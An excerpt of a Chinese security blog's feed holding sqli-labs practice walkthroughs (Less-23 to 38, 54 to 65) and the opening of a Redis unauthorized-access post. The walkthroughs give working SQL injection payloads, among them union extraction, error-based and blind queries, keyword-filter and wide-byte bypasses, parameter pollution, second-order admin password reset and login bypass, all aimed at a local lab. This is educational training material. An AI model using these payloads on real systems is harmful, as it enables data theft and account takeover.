#</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-db7cee15feb21ce2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"><br>根据观察列名应该就是第三个secet_IKU1后面几位应该就是随机产生的，哈哈现在获取flag了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select id,sessid,secret_IKU1 from challenges.8al0pvg8mg -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-1421a3be8fe22b3a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"><br>哈哈哈，后面直接提交就可以了啦！透个底，作者第一次成功的次数是8次，这个是第二次写博客的时候重新测试的。</p><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一个和上一个差不多，不过将次数增加到了14次，可见难度肯定又有上升了！先来看看闭合情况：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-55/?id=1) -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>没有报错，很难受，就一个括号的闭合，我竟然猜了6次！！！！！太浪费了，太浪费了。后面就差不多了。54的payload可以直接用，更改一下闭合就行了。最后9次才出来，有点丢人。</p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>同样是14次，按照之前的套路，这个时候应该是一个有报错的双重闭合。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-56/?id=1<span class="string">') -- #</span></span><br></pre></td></tr></table></figure></p><p>单引号加括号，没意思，大家可以自己玩玩。</p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>我猜应该也是不同的闭合，每次套餐四个不是吗？<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-57/?id=1<span class="string">" -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一次就给力了，只有5次机会，这就基本要保证我们每一次都不能出现错误。<br>测试了一下还是单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-58/?id=1<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p><p>试一下54的payload发现不行！这样不行，那就得换方法了，发现可以报错，试试我们之前的updatexml的报错看看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-58/?id=1<span class="string">' and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">')),1))-- #</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-2fbee840c7552ba2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"><br>成功，但是次数不够了，尴尬，只能重开一局了。<br>后面的话就直接修改updatexml里面的第二个参数的查询语句就可以啦，我就不废话了。</p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>这个比上面那个还简单，没有闭合。根据报错可以看出：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-59/?id=1 and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'challenges'</span>)),1))-- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>和上面一样，闭合情况改为了双引号加括号：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-60/?id=1<span class="string">") -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>哇，这一次，我没有试出来，看了源码才弄出来闭合。。。。头皮发麻，单引号加两重括号，这第一次见：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-61/?id=1<span class="string">')) -- #</span></span><br></pre></td></tr></table></figure></p><p>其他的就和之前的一样。</p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>我的天，这一次让我们130次的机会，我猜现在肯定就只能利用布尔的盲注，不然照实验这么抠的，怎么会给130次机会。。<br>可以看到，现在没有报错，只能自己猜闭合情况，然后union联合查询也没用，只能利用布尔盲注。<br>闭合是单引号加括号。<br>尝试获取信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-62/?id=1<span class="string">') and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">'),1,1))=79,0,sleep(10)) -- #</span></span><br></pre></td></tr></table></figure></p><p>这个时候肯定就只能利用脚本了。大家可以用sqlmap试试，我这里就没弄了。</p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>这个和62一样，不过闭合变成了单引号。</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>这个也一样，闭合变成了双重括号！！！</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>双引号加括号！</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>本来看sqli-lab的分布图应该是有到less-75的，但是一直也没有找到，就暂且不论了。还有这次的sqli-lab的实验过程中，基本都是手动做的，因此很多需要布尔，时间的盲注的less都没有好好弄，之后有时间会整理出一套用工具的教程来完善一下。<br>就像我的学长曾经指导我一样，他没有具体去教我如何学习渗透，学习注入的知识，他很鄙视渗透，甚至都不愿教我们，但他又承认，这是安全工作者必备的技能。<br>安全学习过程中，路漫漫其修远兮！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-labs实验Task4（less54-65）&quot;&gt;&lt;a href=&quot;#Sqli-labs实验Task4（less54-65）&quot; class=&quot;headerlink&quot; title=&quot;Sqli-labs实验Task4（less54-65）&quot;&gt;&lt;/a&gt;Sqli-
      
    
    </summary>
    
      <category term="攻防实验" scheme="http://rliyuqing.github.io/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="sqli-labs" scheme="http://rliyuqing.github.io/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-lab实验Task2（less23-38）</title>
    <link href="http://rliyuqing.github.io/2019/04/15/7.%20Sqli-lab%E5%AE%9E%E9%AA%8CTask2%EF%BC%88less23-38%EF%BC%89/"/>
    <id>http://rliyuqing.github.io/2019/04/15/7. Sqli-lab实验Task2（less23-38）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:48:53.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs实验Task2（less23-38）"><a href="#Sqli-labs实验Task2（less23-38）" class="headerlink" title="Sqli-labs实验Task2（less23-38）"></a>Sqli-labs实验Task2（less23-38）</h1><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>进入实验页面可以看到又回到了最开始的类型，我们尝试一下有没有注入。<br>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-23/?id=1’</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-d7b292138289ee69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>根据报错可以知道是使用单引号闭合的，继续测试。<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-23/?id=1<span class="string">' order by 1 -- #</span></span><br></pre></td></tr></table></figure></p><p>但是发现无论怎样都报错了，显示语句有错误，猜测并经过后面的源代码查看可知是代码将—和#的注释和转义了，所以才会出错，这个时候我们就只能对后面剩余的单引号进行闭合了。<br>敏感信息获取：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-23/?id=0<span class="string">' union select 1,user(),3 and '</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-91e33010b789f208.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>这个比较简单，过滤了注释符号我们只需要注意闭合后面的单引号就行了</p><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>这个是一个登陆界面的注入测试，首先看到和之前有一些不一样，下面有忘记密码和新用户注册，忘记密码的页面一般是存在注入可能性比较高的地方，去这个页面试试 ：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4092f625bac77a54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>这……这样子啊。还有一个注册界面，可以直接注册一个账号。<br>我们尝试在登陆界面进行注入测试，发现无法成功，很可能注入的点不在这。这个实验的题目叫做Second Degree injection，二次注入，思考思考，问题肯定没这么简单，我们先注册一个，然后登陆试试。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-17d9d83e29def919.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>成功登陆后竟然还有修改密码的功能，放这里肯定没有，既然外面不能注入，那么很有可能在这里注入了。Have a try！<br>额，经过一些测试，发现还是不能注入，那么问题出在哪里呢？<br>进行代码审计看一下源代码：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">'current_password'</span>]);</span><br><span class="line"><span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">'password'</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure></p><p>可以看到在pass_change.php这个文件里面没有对传入的username进行过滤。这样子，我们理一下思路，如果我们新注册一个用户名叫admin’ #然后我们登录了更改密码是不是就可以把admin 的密码改了呢？继续尝试一下。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-1e8417f64549fe12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>登录之后更改密码为123，然后登出。然后用admin和123登录。成功！<br><img src="http://upload-images.jianshu.io/upload_images/6269327-ba8f89ffde8a7144.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br>这个实验的思路特别巧妙，基本没有代码审计的话很难会找到注入的点，所以没有及其敏感的意识很难找到漏洞。</p><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>这个题很简单，我们一进页面就可以看到，告诉我们所以得or和and不能被使用，应该都被过滤了。这样有过一点经验的朋友一定很快就反应过来，这很简单了，绕过这种注释的方法有很多，比如编码转换或者大小写，双写绕过等，我们来试试看。<br>检查注入猜字段：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-25/?id=1’ order by 3 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-428e6b7578c97f4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"><br>可以看到连order by里面的or都被过滤了。我们试试大小写绕过，发现不行，试试双写绕过：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-25/?id=1’ oorrder by 3 -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-4f6f40b4deee6195.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>哈哈，可以，这样就很简单了！后面的过程就都差不多了。</p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这个和上一个差不多，也是提示or和and被过滤了。就是没有报错，试试双写绕过：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-25a/?id=1 oorrder by 3 -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>成功执行，试试敏感信息获取:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-25a/?id=0 union select user(),database(),1 -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>可以看到成功获取了，这里和上一个差不多，用的or和and的时候双写绕过就行。这个和上一个不一样的地方就在于这里是盲注，没有报错，上一个可以根据报错判断一些东西。</p><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>这一次也是一样，我们的空格和注释不能用了，空格和注释被过滤了。试试用%20替换，发现也不行。注释也被过滤了那用注释绕过空格也不行了。换其他绕过方法试试。<br>测试过程中发现or和and还是继续被过滤所以记得双写。<br>试试利用括号绕过的盲注：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-26/?id=1<span class="string">'anandd(ascii(mid(user(),1,1))=114)anandd'</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-78361aa253e34dd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>成功绕过！这个是利用括号来绕过空格执行sql语句的方法，一般使用于盲注，可以看到我选择的是user用户名的第一个字符r的ascii码刚好对于114，成功输出。如果后面的条件不成立就不输出，这样就可以盲注啦。注意双字节绕过or和and。因为注释也被过滤了，所以也要注意对后面的引号进行闭合。</p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>这个也是一样过滤了注释和空格。这个和上个差不多只是把报错给过滤了，使我们看不到报错，不过对于盲注来说这没有太大的影响，我们使用上一个的语句依旧可以注入！</p><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>这一次更狠，union和select被过滤了。经过简单的测试我们发现，这次没有过滤and，or，但过滤了空格和注释。<br>简单的测试一下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-27/?id=1<span class="string">' and '</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p>成功的，那么对于过滤了union和select。但是发现union双写可以绕过，select双写不行，但是大小写能绕过，那就很简单了，和之前的注入差不多：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-27/?id=1<span class="string">'and(ascii(mid(user(),1,1))=114)and'</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p>语句和之前的差不多，主要是绕过空格的，而遇到有select和union的语句只需要大小写绕过就可以了！</p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>原本以为这个和上个差不多，但是发现执行语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-27a/?id=1<span class="string">'and(ascii(mid(user(),1,1))=1144)and'</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p><p>返回正常显示id=1的数据，无论我ascii的值输入多少都显示这个页面。<br>测试后发现这个闭合时双引号。换成语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-27a/?id=1<span class="string">"and(ascii(mid(user(),1,1))=114)and"</span>1<span class="string">"="</span>1</span><br></pre></td></tr></table></figure></p><p>其他的和之前都差不多。</p><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>这一次可以根据页面提示看到union和select被过滤了。<br>尝试猜测闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-28/?id=1<span class="string">')and('</span>1<span class="string">')=('</span>1</span><br></pre></td></tr></table></figure></p><p>正常返回说明单引号闭合。且存在注入，过滤空格，注释。<br>获取数据：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-28/?id=1<span class="string">')and(ascii(mid(user(),1,1))=114)and('</span>1<span class="string">')=('</span>1</span><br></pre></td></tr></table></figure></p><p>和27差不多。只是闭合方式不同</p><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>这里只有union和select被过滤，其他的都没被过滤。这个就更简单了，只需要绕过union和select就足够了，参考上面几个很容易就可以成功注入。<br>随便给一个例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-28a/?id=0<span class="string">') unionunion select select user(),database(),1 and ('</span>1<span class="string">')=('</span>1</span><br></pre></td></tr></table></figure></p><h2 id="环境配置说明（less29-32）"><a href="#环境配置说明（less29-32）" class="headerlink" title="环境配置说明（less29-32）"></a>环境配置说明（less29-32）</h2><p>这四个实验使用到waf，基本原理可以看一下网上的一些博客，大多都有详细说明，比如：<a href="http://www.cnblogs.com/lcamry/p/5762961.html。" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5762961.html。</a><br>因为我使用的是phpstudy，所以也大概说一下我是如何配的。</p><ol><li>下载tomcat，解压就行。</li><li>将tomcat-files.zip解压到tomcat服务器webapp/ROOT目录下，并将29,30,31里的跳转url改为我们自己的。每个人不同，比如我的跳转url设置的是<a href="http://127.0.0.1/sqli-labs-master/Less-29/index.php?id=1。32里面要设置数据库的连接密码。" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-29/index.php?id=1。32里面要设置数据库的连接密码。</a></li><li>下载安装好java环境，可在cmd输入javac测试。</li><li>将下载的mysql-connector-java.jar文件放到tomcat解压文件夹的lib文件夹中</li><li>点击tomcat/bin/startup.bat文件启动tomcat就可以啦。弹出的jar文件不能关掉，不然不能访问tomcat了。<br>然后我们就可以通过访问（tomcat默认开启8080端口）tomcat目录里面的四个实验进行测试了！<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2>可以看到这里页面提示是是使用了世界上最强大的waf，废话不多说我们之间进行挑战看一看。<br>首先判断闭合情况：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></li></ol><p>稍微解释一下，因为我们是tomcat和apache两重的服务器端的，所以我们需要进行两个id的传参，那么如果前后两个传递的不相等会怎么样呢？<br><img src="http://upload-images.jianshu.io/upload_images/6269327-98eaa103a55ac1ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>如果是id=1&amp;id=2，那会显示什么呢？<br>apache（php）解析最后一个参数，即显示id=2的内容。Tomcat（jsp）解析第一个参数，即显示id=1的内容。<br>此处应该是id=2的内容，因为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache处理的数据。<br>那么继续测试，我们使用单引号进行闭合了，看看页面相应：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-3a7f15d1c1247125.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>已经很明显就知道是单引号闭合了。<br>后面其实就很简单了，获取敏感信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=0<span class="string">'  union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><p>很容易获取，但是虽然看着很简单，我们进行代码审计可以看到，这是因为jsp代码中只对tomcat的传参进行了过滤，并没有对后面apache传入的进行防范，所以很容易就成功了。<br>其他的可以自己构造语句进行测试。</p><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>这个和上个差不多，只不过把报错屏蔽了，把闭合换成了双引号。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-30/index.jsp?id=1&amp;id=0<span class="string">" union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><p>其他可自己继续进行测试。</p><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>依旧差不多，有错误提示，闭合是双引号加括号。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-31/index.jsp?id=1&amp;id=0<span class="string">")  union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>这一次不一样了，试了很多闭合发现依旧正常返回，第一个反应就是不是第二个传参，而是第一个传参，所以对第一个进行测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-32/index.jsp?id=1<span class="string">') -- #&amp;id=1</span></span><br></pre></td></tr></table></figure></p><p>多试几次便可知道闭合方式是单引号加括号。<br>敏感信息获取：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1:8080/sqli-labs/Less-32/index.jsp?id=1<span class="string">') union select 1,user(),database() -- #&amp;id=1</span></span><br></pre></td></tr></table></figure></p><p>突然发现这里还没有限制输出。。。</p><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>回到之前的apache的服务器的实验链接。<br>首先观察一下新的挑战的页面的提示多了一行。上面一行是我们的传参，下面一行是我们输入的十六进制编码之后的数，我们可以用hackbar进行hex encode看看1编码之后就是31。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-40010cf41481cfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>闭合测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-33/?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-0fb9ae426945eecd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>果然，被过滤了，那么我们就考虑如何绕过这个过滤。在之前也遇到这样的问题我们试着绕过看看。这里是反斜杠过滤，可以看到下面的hex编码是5c，对于这个有着典型的绕过方法—宽字节注入。<br>大概说一说这个宽字节注入。我们的mysql在使用gbk编码的时候会将两个字符看成一个汉字（前一个字符的ascii码必须大于128才能到汉字的范围）。所以这个时候如果我们构造一个如下的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-33/?id=1%df%27</span><br></pre></td></tr></table></figure></p><p>就会报错！<br><img src="http://upload-images.jianshu.io/upload_images/6269327-fad023b8ea55aa37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-5f2444d84754947f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>可以看到报错出现一个乱码，因为mysql不支持那个中文字符。同时后面的单引号也逃逸出来了，这就是因为mysql将%df%5c两个字符当成一个汉字来看，我们就绕过来这个反斜杠了。想要了解更多可以google宽字节输入看看。<br>敏感信息获取：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-33/?id=0%df%27 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>这次又回到了登录框的注入。<br>随便一个万能密码试试：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-f75d4532bf4a1e1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br>果然，又是反斜杠过滤了，这里是post的传参，要过滤反斜杠，参考上面的。因为上面是url传参，所以可以用url编码构造宽字节绕过，但这里是post，我们是否可以构造其他的编码来绕过反斜杠呢？<br>这里我们使用另一种构造：将utf-8转换为utf-16或 utf-32进行过滤反斜杠。我们通过网上的工具，将utf-8的单引号转换成utf-16的：将’转为utf-16为�’，然后我们就可以用万能密码进行登录了。账号填：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ �<span class="string">'  or  1=1 -- #</span></span><br></pre></td></tr></table></figure></p><p>密码随便填就可以成功登陆啦。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7dde8e45775fbf9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Less-35</span><br><span class="line">有一个新挑战，尝试闭合发现被反斜杠过滤了，尝试宽字节注入，发现也不行！但是在测试的时候我们发现，这里的id是没有被闭合的。。。。所以直接就可以注入！</span><br><span class="line">​``` bash</span><br><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-35/?id=0 union select 1,user(),database() -- #</span><br></pre></td></tr></table></figure></p><p>这个比较简单，不要想多了。</p><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>这个和上面的差不多：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-36/?id=0%df%27 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>宽字节注入。<br>结合上面的我们也可以利用utf-16进行注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-36/?id=0%EF%BF%BD%27 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>这个和34的差不多,用户填：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ �<span class="string">'  or  1=1 -- #</span></span><br></pre></td></tr></table></figure></p><p>密码随便填就可以成功登陆，原理和34差不多。只不过源码部分用不同的函数过滤。</p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>emmmmmm这个也很简单：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-38/?id=0<span class="string">' union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><p>基本都在前面出现过。<br>part2的部分也结束了，会尽快把后面的也写上来的！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-labs实验Task2（less23-38）&quot;&gt;&lt;a href=&quot;#Sqli-labs实验Task2（less23-38）&quot; class=&quot;headerlink&quot; title=&quot;Sqli-labs实验Task2（less23-38）&quot;&gt;&lt;/a&gt;Sqli-
      
    
    </summary>
    
      <category term="攻防实验" scheme="http://rliyuqing.github.io/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="sqli-labs" scheme="http://rliyuqing.github.io/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问漏洞</title>
    <link href="http://rliyuqing.github.io/2019/04/15/2.%20redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://rliyuqing.github.io/2019/04/15/2. redis未授权访问漏洞/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:48:10.938Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><hr><h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="redis是什么？"><a href="#redis是什么？" class="headerlink" title="redis是什么？"></a>redis是什么？</h3><p>通过查阅资料可知，redis即为key-value数据库中的一种。这有点用名词解释名词了，但是这有必要先解释一下key-value数据库。<br>Key-value数据库顾名思义就是利用键和数据值相对应存储的一种数据库，就类似于java中的map。我们整个数据库就可以看成一个大的map，在map中一个特地的key对应一个唯一的value。<br>同时我们redis作为key-value数据库的一种他支持很多很多的value的类型，redis也是一种内存型的数据库，所以可以提供高效率的读写，但同时他占用cpu将会很高。在内存上操作， 我们很容易想到数据的持久化的问题，不用担心，redis可以将数据持久化到硬盘中，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。<br>看看网上说的reids相对于其他key-value数据库的三大优点：<br>·Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。<br>·Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。<br>·Redis支持数据的备份，即master-slave模式的数据备份。</p><h3 id="redis未授权访问漏洞-1"><a href="#redis未授权访问漏洞-1" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h3><p>Redis在默认情况会将服务绑定在0.0.0.0:6379上，从而将服务暴露在公网环境下，如果在没有开启安全认证的情况下，可以导致任意用户未授权访问Redis服务器并Redis进行读写操作。攻击者在未授权访问Redis服务器时可以通过上传公钥的方法将自己的公钥上传到Redis服务器上，达到免密登陆的效果。</p><h3 